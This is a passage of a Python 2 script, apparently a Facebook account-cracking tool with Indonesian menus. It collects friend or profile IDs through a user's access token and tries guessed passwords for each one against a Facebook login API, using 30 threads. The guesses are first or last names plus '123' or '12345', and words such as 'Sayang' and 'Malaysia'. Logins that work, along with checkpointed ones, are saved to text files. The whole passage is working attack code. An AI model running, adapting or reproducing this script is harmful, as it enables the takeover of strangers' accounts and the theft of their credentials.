                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    oke = open('done/malay.txt', 'a')
                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    cek = open('done/malay.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        oke = open('done/malay.txt', 'a')
                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        cek = open('done/malay.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = 'Sayang'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            oke = open('done/malay.txt', 'a')
                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            cek = open('done/malay.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = 'Malaysia'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                oke = open('done/malay.txt', 'a')
                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                cek = open('done/malay.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = 'Anjing'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    oke = open('done/malay.txt', 'a')
                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    cek = open('done/indo.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = 'Sayang'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos7
                                        oke = open('done/malay.txt', 'a')
                                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos7
                                        cek = open('done/malay.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['last_name'].lower() + '12345'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos8
                                            oke = open('done/malay.txt', 'a')
                                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos8
                                            cek = open('done/malay.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSelesai ...'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSalin hasil crack lalu simpan\x1b[1;91m : \x1b[1;97mdone malay.'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    raw_input('\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m) ')
    os.system('python2 Crackv1.py')


def crack_thai():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print ' '
    print '\x1b[1;91m _________   ________.    '
    print '\x1b[1;97m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
    print '\x1b[1;94m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
    print '\x1b[1;94m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
    print '\x1b[1;97m  \\______  /|__|   |___  /'
    print '\x1b[1;91m         \\/            \\/ '
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x1b[1;97m(\x1b[1;93mThailand\x1b[1;97m)\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m(\x1b[1;97m1\x1b[1;94m) \x1b[1;97mCrack Dari Daftar Teman'
    print '\x1b[1;94m(\x1b[1;97m2\x1b[1;94m)\x1b[1;97m Crack Dari Id Teman/Publik'
    print '\x1b[1;94m(\x1b[1;97m3\x1b[1;94m)\x1b[1;97m Crack Dari File'
    print '\x1b[1;94m(\x1b[1;91m0\x1b[1;94m) \x1b[1;97mKembali'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    pilih_thai()


def pilih_thai():
    teak = raw_input('\x1b[1;97m(?) Pilih \x1b[94m> \x1b[1;97m ')
    if teak == '':
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
        pilih_thai()
    else:
        if teak == '1' or teak == '01':
            os.system('clear')
            print ' '
            print '\x1b[1;91m _________   ________.    '
            print '\x1b[1;97m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;94m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;94m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;97m  \\______  /|__|   |___  /'
            print '\x1b[1;91m         \\/            \\/ '
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '             \x1b[1;94m>>> \x1b[1;93mCRACK THAILAND \x1b[1;94m<<<'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif teak == '2' or teak == '02':
            os.system('clear')
            print ' '
            print '\x1b[1;91m _________   ________.    '
            print '\x1b[1;97m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;94m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;94m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;97m  \\______  /|__|   |___  /'
            print '\x1b[1;91m         \\/            \\/ '
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '             \x1b[1;94m>>> \x1b[1;93mCRACK THAILAND \x1b[1;94m<<<'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            idt = raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) ID Publik \x1b[1;91m:\x1b[1;97m ')
            try:
                pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                sp = json.loads(pok.text)
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama Akun \x1b[1;91m:\x1b[1;97m ' + sp['name']
            except KeyError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) ID publik Tidak Ada!'
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
                crack_thai()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Tidak ada koneksi !'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif teak == '3' or teak == '03':
            os.system('clear')
            print ' '
            print '\x1b[1;91m _________   ________.    '
            print '\x1b[1;97m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;94m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;94m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;97m  \\______  /|__|   |___  /'
            print '\x1b[1;91m         \\/            \\/ '
            try:
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                print '             \x1b[1;94m>>> \x1b[1;93mCRACK THAILAND \x1b[1;94m<<<'
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                idlist = raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mNama File\x1b[1;91m :\x1b[1;97m ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) File tidak ada ! '
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali \x1b[1;97m)')
            except IOError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) File tidak ada !'
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
                crack_thai()

        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
            pilih_thai()
        print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Total ID\x1b[1;91m  :\x1b[1;97m ' + str(len(id))
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Crack Berjalan ' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\x1b[0m'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\x1b[0m'
    print 50 * '\x1b[1;94m\xe2\x94\x80'

    def main(arg):
        zowe = arg
        try:
            sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;97m%H\x1b[1;97m:\x1b[1;97m%M\x1b[1;97m:\x1b[1;97m%S')))
            sys.stdout.flush()
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                oke = open('done/thai.txt', 'a')
                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                cek = open('done/thai.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    oke = open('done/thai.txt', 'a')
                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
